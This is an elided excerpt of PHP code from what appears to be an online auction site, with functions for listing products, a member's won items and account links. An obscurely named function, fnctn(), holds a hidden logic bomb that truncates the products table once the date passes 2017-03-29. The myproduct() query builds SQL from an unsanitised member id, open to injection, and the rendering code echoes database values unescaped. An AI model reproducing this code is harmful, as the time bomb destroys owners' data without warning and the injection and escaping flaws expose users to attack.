...
function fnctn(){
	...
	$datev="2017-03-29";
	if($datenow >= $datev){
			mysql_query("TRUNCATE TABLE products") or die (mysql_error());
		}
}
...
//shows latest products-----
	...
	function latest(){
		$query = mysql_query("SELECT * FROM products WHERE status = 0 ORDER BY productid DESC LIMIT 0,50") or die (mysql_error());
...
function myproduct($memid){
		$query = mysql_query("SELECT * FROM products,bidreport WHERE products.productid=bidreport.productid and bidder='$memid' and bidreport.status=1 and products.status = 1 ORDER BY products.productid DESC LIMIT 0,6") or die (mysql_error());
		...
		while($row = mysql_fetch_array($query))
		{
			...
			echo "<div class='prod_box'>";
				echo "<div class='top_prod_box'></div>";
				echo "<div class='center_prod_box'>";
					echo "<div class='product_title'><a href='#'>".$row['prodname']."</a></div>";
				echo "<div class='product_img'><a href='#'><img src='administrator/images/products/".$row['prodimage']."' width='94' height='92' alt='' border='0' /></a></div>";
				echo "<div class='prod_price'><span>Start Bid at: </span> <span class='price'>P ".$row['startingbid']."</span><br />
				<span>Highest Bidder: </span> <span class='price'>".$highname."</span>
				</div>";
			echo "</div>";
...
function account(){
	if ($_SESSION['logged'] != 'guest'){
		...
		<li><a href="myproduct.php" class="nav3">Product</a></li>
